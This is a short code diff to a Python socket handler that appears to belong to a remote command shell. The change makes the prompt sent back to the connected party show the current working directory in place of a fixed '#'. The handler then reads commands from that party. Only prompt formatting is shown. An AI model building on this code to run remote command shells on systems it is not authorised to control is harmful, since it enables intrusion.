@@ -28,7 +28,7 @@ def run_project(pr, q):
 def client_handler(s):
     response = ''
     while True:
-        s.sendall("{}\n<remote:#>".format(response.rstrip()))
+        s.sendall("{}\n<remote:{}>".format(response.rstrip(), os.getcwd()))
         cmd = ""
         while "\n" not in cmd:
             cmd += s.recv(1024)
